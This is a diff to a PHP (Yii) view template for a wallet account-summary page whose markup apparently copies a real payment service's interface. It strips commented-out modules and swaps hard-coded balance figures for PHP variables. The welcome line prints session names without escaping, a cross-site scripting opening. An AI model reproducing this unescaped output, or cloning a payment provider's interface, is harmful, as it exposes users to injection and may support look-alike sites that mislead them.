@@ -30,28 +30,6 @@ $baseUrl = Yii::app()->theme->baseUrl;
                 <div class="engagementMainBar-container js_engagementMainBar-container">
                     <div class="summarySection engagementMainBar row">
                         <div class="col-sm-7 progressAndWelcome">
-                            <!--
-                            <div id="js_progressMeterView" class="progressMeter nemo_progressMeterView" data-total-percentage="80" data-hide-percent-animation="">
-                                    <div id="js_outerCircle" class="outerCircle">
-                                            <div class="half lessThan50">
-                                                    <div class="pie right" style="-webkit-transform: rotate(180deg); -moz-transform: rotate(180deg); -ie-transform: rotate(180deg); -o-transform: rotate(180deg); transform: rotate(180deg);"></div>
-                                            </div>
-                                            <div class="half greaterThan50 js_greaterThan50">
-                                                    <div class="pie left" style="-webkit-transform: rotate(108deg); -moz-transform: rotate(108deg); -ie-transform: rotate(108deg); -o-transform: rotate(108deg); transform: rotate(108deg);"></div>
-                                            </div>
-                                    </div>
-                                    <div id="js_innerCircle" class="innerCircle">
-                                            <div class="profilePhotoTable">
-                                                    <div id="js_profilePhotoView" class="profilePhotoContainer hasFileReader" name="EM_Photo_Start" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">
-                                                            <a id="js_profilePhotoParent" class="profilePhotoParent " name="emUploadPhotoStart" data-profile-photo="{}" data-wurfl="{}"><span id="js_user_icon" class="profilePhotoIcon icon icon-profile-add-large" aria-hidden="true" data-hover-text="Add a photo"></span></a>
-                                                    </div>
-                                            </div>
-                                            <div id="js_percentageContainer" class="percentageContainer nemo_percentageContainer">
-                                                    <div id="js_percentage" class="nemo_accountCompletionPercent fadeOut hide">80%</div>
-                                            </div>
-                                    </div>
-                            </div>
-                            -->
 
                             <div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule " data-module-number="0">
                                 <p class="vx_h2 engagementWelcomeMessage nemo_welcomeMessageHeader">Welcome, <?php echo Yii::app()->session['first_name'] . " " . Yii::app()->session['last_name']; ?>!</p>
@@ -92,8 +70,8 @@ $baseUrl = Yii::app()->theme->baseUrl;
                             <section class="walletModule nemo_balanceModule" aria-labelledby="walletModuleHeader">
                                 <div class="balanceModule">
                                     <h3 class="vx_h5 moduleHeader"><a href="" class=" moduleHeaderLink" name="balanceDetails" data-pagename="main:walletweb:wallet:balance:details" data-pagename2="main:walletweb:wallet:balance:details:::" data-track-type="link">Account Balance</a></h3>
-                                    <div class="balanceNumeral nemo_balanceNumeral"><span class="vx_h2">$502.00</span>
-                                        <span class="vx_small-text numeralLabel">Available Credit: $100</span>
+                                    <div class="balanceNumeral nemo_balanceNumeral"><span class="vx_h2"><?php  echo $user_balance;  ?></span>
+                                        <span class="vx_small-text numeralLabel">Available Credit: <?php echo "$".$user_model->credit_limits;   ?></span>
                                     </div>
                                     <!--
                                     <ul class="balanceActions nemo_balanceActions">
@@ -133,26 +111,6 @@ $baseUrl = Yii::app()->theme->baseUrl;
                             </section>
 
 
-                            <!--
-                            <section class="walletModule nemo_sellingToolsModule sellingToolsModule" aria-labelledby="walletModuleHeader">
-                                    <h3 class="vx_h5 moduleHeader"><a href="" target="_top" class="moduleHeaderLink nemo_sellingToolsHeader" name="sellingToolsHeader" {~}data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Selling tools</a></h3>
-                                    <ul class="moduleListItems">
-                                            <li><a href="#" target="_top" class="nemo_sellingToolsInvoice" name="sellingToolsInvoice" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Manage invoices</a></li>
-                                            <li><a href="#" target="_blank" class="nemo_sellingToolsMOS" name="sellingToolsMOS" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">MultiOrder shipping</a></li>
-                                            <li><a href="#" target="_blank" class="nemo_sellingToolsSellerPref" name="sellingToolsSellerPref" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Seller preferences</a></li>
-                                    </ul>
-                            </section>
-                            -->
-
-                            <!--
-                            <div class="accountStatusModule nemo_accountStatusModule">
-                                    <h3 class="vx_h5">More about your account</h3>
-                                    <ul>
-                                            <li><a href="#" target="" class="nemo_acctStatusUpgrade" name="Summary_AcctStatusUpgrade" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Upgrade to a Business account</a></li>
-                                            <li><a href="#" target="_top" class="small-text nemo_acctStatusResCenter" name="Summary_ResolutionCenter" data-pagename="main:walletweb:summary::main" data-pagename2="main:walletweb:summary::main:::" data-track-type="link">Resolve a problem in our Resolution Center</a></li>
-                                    </ul>
-                            </div>
-                            -->
 
                         </div>
 
